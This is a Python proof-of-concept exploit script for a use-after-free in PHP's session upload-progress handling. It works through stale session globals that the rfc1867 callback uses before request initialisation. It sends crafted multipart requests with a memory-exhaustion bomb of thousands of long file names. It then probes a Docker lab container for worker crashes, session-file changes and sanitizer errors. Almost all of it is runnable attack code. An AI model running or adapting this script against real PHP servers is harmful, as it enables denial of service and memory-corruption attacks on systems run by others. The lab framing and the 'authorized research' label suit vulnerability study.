#!/usr/bin/env python3
"""
Chain D Pure: Stale PS() session globals exploitation

The REAL stale EG() mechanism (confirmed by patch 3584a98):
  rfc1867_post_handler() calls php_session_rfc1867_callback() BEFORE RINIT.
  Session module globals (PS()) are NOT re-initialized at this point.
  PS(session_status), PS(mod_data), PS(id) retain values from the PREVIOUS request.

Attack flow:
  Request 1: multipart + PHP_SESSION_UPLOAD_PROGRESS → starts session via callback
             → PS(mod_data) points to session file handler data in ZMM
             → request ends, ZMM destroyed, PS() NOT fully cleared

  Request 2: multipart + PHP_SESSION_UPLOAD_PROGRESS → callback fires BEFORE RINIT
             → PS(session_status) may still be php_session_active()
             → PS(mod_data) is dangling (ZMM from Request 1 was destroyed)
             → callback uses stale PS() → UAF

  Add OOM: OOM in Request 2 triggers longjmp → skips even more cleanup
           → shutdown walks structures with stale PS() and freed EG(objects_store)

The fix (3584a98) adds php_rinit_session_globals() in MULTIPART_EVENT_START
to clear PS() before the callback uses it.

For authorized security research only.
"""

import argparse
import re
import socket
import struct
import subprocess
import sys
import time


def send_multipart(host, port, path, boundary, parts, cookies=None, timeout=60):
    cookie_hdr = f"Cookie: {cookies}\r\n" if cookies else ""
    body = "".join(parts).encode("latin1")
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"{cookie_hdr}"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    s = socket.create_connection((host, port), timeout=timeout)
    off = 0
    while off < len(req):
        s.sendall(req[off:off + 65536])
        off += 65536
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def http_get(host, port, path, timeout=10):
    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req.encode())
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_body(resp):
    if b"\r\n\r\n" in resp:
        return resp.split(b"\r\n\r\n", 1)[1]
    return b""


def get_status(resp):
    return resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"


def get_pid(host, port):
    try:
        resp = http_get(host, port, "/chain_d_probe.php?action=info")
        body = get_body(resp).decode("latin1", "replace")
        m = re.search(r"PID:\s*(\d+)", body)
        return int(m.group(1)) if m else None
    except:
        return None


def clear_sessions():
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c", "rm -f /tmp/sess_*"],
        capture_output=True, timeout=5)


def list_sessions():
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         "ls -la /tmp/sess_* 2>/dev/null || echo none"],
        capture_output=True, text=True, timeout=5)
    return r.stdout.strip()


def read_session(sid):
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "cat", f"/tmp/sess_{sid}"],
        capture_output=True, timeout=5)
    return r.stdout


def docker_logs(lines=20):
    r = subprocess.run(
        ["docker", "logs", "--tail", str(lines), "php2shell-apache"],
        capture_output=True, text=True, timeout=5)
    return r.stderr


def build_upload_progress_parts(boundary, progress_key, num_files, fname_size=50):
    parts = []
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n"
        f"{progress_key}\r\n"
    )
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * max(1, fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    return parts


def build_oom_parts(boundary, progress_key, num_files=12000, fname_size=500):
    """Upload progress + OOM bomb: triggers session start then OOM."""
    return build_upload_progress_parts(boundary, progress_key, num_files, fname_size)


def main():
    ap = argparse.ArgumentParser(description="Chain D: Stale PS() exploitation")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18081)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--num-files-setup", type=int, default=10,
                    help="Files in setup request (small, no OOM)")
    ap.add_argument("--num-files-oom", type=int, default=14000,
                    help="Files in OOM request")
    ap.add_argument("--fname-size-oom", type=int, default=500)
    ap.add_argument("--rounds", type=int, default=5)
    args = ap.parse_args()

    boundary = "STALE_PS"
    sid = "aabbccddee112233aabbccddee112233"

    print("=" * 70)
    print("  Chain D: Stale PS() Session Globals Exploitation")
    print("=" * 70)
    print(f"  Target: {args.host}:{args.port}{args.path}")
    print(f"  Session: {sid}")
    print(f"  Theory: rfc1867 callback uses stale PS() from previous request")
    print()

    # ── Baseline ─────────────────────────────────────────────────────
    clear_sessions()
    pid = get_pid(args.host, args.port)
    print(f"[0] Worker PID: {pid}")

    for rnd in range(1, args.rounds + 1):
        print(f"\n{'='*70}")
        print(f"  Round {rnd}/{args.rounds}")
        print(f"{'='*70}")

        # ── Step A: Setup request with upload progress (no OOM) ──────
        print(f"\n[A] Setup: multipart + upload_progress (session start)...")
        setup_parts = build_upload_progress_parts(
            boundary, f"key_r{rnd}", args.num_files_setup, fname_size=20)
        resp = send_multipart(
            args.host, args.port, args.path, boundary, setup_parts,
            cookies=f"PHPSESSID={sid}")
        status = get_status(resp)
        print(f"    Status: {status}")

        time.sleep(0.3)
        sess_data = read_session(sid)
        print(f"    Session file: {len(sess_data)} bytes")

        pid_a = get_pid(args.host, args.port)
        print(f"    Worker PID: {pid_a}")

        # ── Step B: OOM request with upload progress (stale PS()) ────
        print(f"\n[B] OOM bomb + upload_progress (stale PS() from step A)...")
        oom_parts = build_oom_parts(
            boundary, f"oom_r{rnd}",
            num_files=args.num_files_oom, fname_size=args.fname_size_oom)
        resp = send_multipart(
            args.host, args.port, args.path, boundary, oom_parts,
            cookies=f"PHPSESSID={sid}", timeout=120)

        oom_triggered = False
        crash = False
        if resp:
            status = get_status(resp)
            body = get_body(resp).decode("latin1", "replace")
            print(f"    Status: {status}")
            if "500" in status or "Allowed memory" in body:
                oom_triggered = True
                if "tried to allocate" in body:
                    idx = body.find("tried to allocate")
                    print(f"    OOM: {body[idx:idx+60]}")
        else:
            crash = True
            oom_triggered = True
            print("    [!] NO RESPONSE - worker crashed!")

        time.sleep(0.5)

        # ── Step C: Check if worker survived ─────────────────────────
        pid_b = get_pid(args.host, args.port)
        if pid_b is None:
            print(f"    [!] Worker DEAD after OOM!")
            crash = True
        elif pid_b != pid_a:
            print(f"    [!] Worker REPLACED: {pid_a} → {pid_b}")
            crash = True
        else:
            print(f"    Worker survived: PID {pid_b}")

        # ── Step D: Check session file state ─────────────────────────
        sess_after = read_session(sid)
        print(f"    Session file after OOM: {len(sess_after)} bytes")

        # ── Step E: Send follow-up request (deserialization) ─────────
        print(f"\n[C] Follow-up: multipart + upload_progress (deserialize)...")
        followup_parts = build_upload_progress_parts(
            boundary, f"followup_r{rnd}", 3, fname_size=20)
        try:
            resp = send_multipart(
                args.host, args.port, args.path, boundary, followup_parts,
                cookies=f"PHPSESSID={sid}")
            status = get_status(resp)
            body = get_body(resp).decode("latin1", "replace")
            print(f"    Status: {status}")
            if "500" in status or "Fatal" in body or "Segfault" in body.lower():
                print(f"    [!] Error on follow-up: {body[:200]}")
        except Exception as e:
            print(f"    [!] Follow-up failed: {e}")
            crash = True

        pid_c = get_pid(args.host, args.port)
        if pid_c is None:
            print(f"    [!] Worker DEAD after follow-up!")
            crash = True
        elif pid_b and pid_c != pid_b:
            print(f"    [!] Worker REPLACED after follow-up: {pid_b} → {pid_c}")

        # ── Check docker logs ────────────────────────────────────────
        logs = docker_logs(30)
        relevant = [l for l in logs.split("\n") if any(kw in l.lower()
            for kw in ["segfault", "signal", "core dump", "asan", "heap-use",
                       "use-after-free", "buffer-overflow", "double-free",
                       "stack-buffer", "null deref"])]
        if relevant:
            print(f"\n    [!!!] CRASH INDICATORS:")
            for l in relevant[-5:]:
                print(f"      {l}")

        if crash:
            print(f"\n    [+] CRASH DETECTED in round {rnd}!")
            break

    # ── Final analysis ───────────────────────────────────────────────
    print(f"\n{'='*70}")
    print("  RESULTS")
    print(f"{'='*70}")
    final_pid = get_pid(args.host, args.port)
    print(f"\n  Final worker PID: {final_pid}")
    print(f"  Crash detected: {crash}")
    print(f"  Sessions: {list_sessions()}")

    # Check docker logs for any crash evidence
    all_logs = docker_logs(50)
    crash_lines = [l for l in all_logs.split("\n") if any(kw in l.lower()
        for kw in ["segfault", "signal 11", "core", "asan", "sanitizer"])]
    if crash_lines:
        print(f"\n  CRASH EVIDENCE in docker logs:")
        for l in crash_lines:
            print(f"    {l}")
    else:
        print(f"\n  No crash in docker logs.")
        print(f"  Note: stock PHP may silently handle UAF without crashing.")
        print(f"  An ASAN build would detect the stale PS(mod_data) dereference.")

    return 0


if __name__ == "__main__":
    sys.exit(main())
